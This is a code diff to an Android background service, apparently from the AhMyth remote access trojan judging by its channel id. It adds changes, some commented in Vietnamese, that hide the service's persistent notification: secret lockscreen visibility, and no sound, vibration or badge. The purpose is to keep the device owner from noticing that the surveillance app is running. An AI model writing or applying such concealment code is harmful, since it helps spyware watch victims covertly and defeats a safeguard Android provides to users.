@@ -28,12 +28,17 @@ public class MainService extends Service {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             String channelId = "ahmyth_service_channel";
             String channelName = getString(R.string.service_channel_name);
+            // Tạo channel với IMPORTANCE_NONE để ẩn notification
             android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_NONE);
             channel.setLightColor(android.graphics.Color.BLUE);
-            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_PRIVATE);
+            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
+            channel.enableVibration(false);
+            channel.setShowBadge(false);
+            
             android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
+                // Tạo notification ẩn
                 android.app.Notification notification = new android.app.Notification.Builder(this, channelId)
                         .setOngoing(true)
                         .setSmallIcon(R.mipmap.ic_launcher)
@@ -41,12 +46,14 @@ public class MainService extends Service {
                         .setContentText(getString(R.string.service_notification_active))
                         .setPriority(android.app.Notification.PRIORITY_MIN)
                         .setCategory(android.app.Notification.CATEGORY_SERVICE)
+                        .setVibrate(new long[]{})
+                        .setSound(null)
+                        .setVisibility(android.app.Notification.VISIBILITY_SECRET)
                         .build();
                 startForeground(101, notification);
             }
         } else {
-             // For older versions, standard notification creation if needed, 
-             // or just start standard service (less restrictive)
+             // For older versions
         }
 
         contextOfApplication = this;
